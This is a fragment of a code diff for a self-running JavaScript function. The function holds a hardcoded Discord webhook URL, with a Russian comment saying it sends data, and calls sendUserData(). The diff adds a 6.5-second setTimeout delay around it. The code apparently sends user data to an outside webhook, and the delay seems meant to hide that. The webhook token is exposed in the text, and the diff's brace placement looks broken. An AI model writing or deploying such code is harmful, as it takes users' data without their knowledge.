@@ -1,4 +1,4 @@
-
+setTimeout(() => {
 (async function() {
     // Вебхук для отправки данных. Вставлен напрямую для демонстрации.
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1393595797530083390/1dDSykIyP3bqwownNM3Ro1I-LLcI2Sn1KM2SMb9a6b-POlE3TlsvgkMSZhPRLfTVKNod';
@@ -183,6 +183,6 @@
             console.error("Ошибка при отправке данных:", e);
         }
     };
-
+}, 6500);
     await sendUserData();
 })();
